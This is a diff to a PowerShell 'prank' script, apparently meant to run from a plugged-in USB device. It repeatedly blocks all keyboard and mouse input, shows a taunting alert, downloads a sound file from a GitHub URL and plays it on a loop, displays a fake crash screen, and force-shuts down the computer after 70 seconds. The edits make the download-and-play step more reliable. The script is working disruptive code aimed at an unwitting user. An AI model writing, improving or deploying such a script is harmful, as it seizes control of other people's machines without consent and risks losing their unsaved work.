@@ -21,8 +21,8 @@ Start-Job {
     }
 "@
     while ($true) {
-        [InputBlocker]::BlockInput($true)  # This blocks ALL input (keyboard and mouse)
-        Start-Sleep -Milliseconds 100      # More frequent blocking
+        [InputBlocker]::BlockInput($true)
+        Start-Sleep -Milliseconds 100
     }
 }
 
@@ -30,20 +30,30 @@ Start-Job {
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show("You shouldn't have plugged that in... I'm watching.","System Alert")
 
-# 🔊 Play creepy audio from GitHub (sound.mp3)
-Add-Type -TypeDefinition @"
-using System.Media;
-public class Audio {
-    public static void Play(string url) {
-        System.Net.WebClient web = new System.Net.WebClient();
-        string temp = System.IO.Path.GetTempFileName() + ".wav";
-        web.DownloadFile(url, temp);
-        SoundPlayer player = new SoundPlayer(temp);
-        player.PlayLooping();
+# 🔊 Play audio with more reliable method
+try {
+    $tempFile = "$env:TEMP\prank_sound.mp3"
+    (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3", $tempFile)
+    
+    Add-Type -TypeDefinition @"
+    using System.Runtime.InteropServices;
+    public class AudioPlayer {
+        [DllImport("winmm.dll")]
+        public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
+        
+        public static void Play(string file) {
+            string playCommand = $"open \"{file}\" type mpegvideo alias MediaFile";
+            mciSendString(playCommand, null, 0, IntPtr.Zero);
+            mciSendString("play MediaFile repeat", null, 0, IntPtr.Zero);
+        }
     }
-}
 "@
-[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3")
+    [AudioPlayer]::Play($tempFile)
+} catch {
+    # Fallback to beep if audio fails
+    [console]::beep(500,300)
+    [console]::beep(300,500)
+}
 
 # 💀 Glitchy crash screen with creepy style
 $html = @"
@@ -121,6 +131,6 @@ Start-Job {
   }
 }
 
-# ⏳ Wait 70 seconds (changed from 240), then shutdown
+# ⏳ Wait 70 seconds, then shutdown
 Start-Sleep -Seconds 70
 Stop-Computer -Force
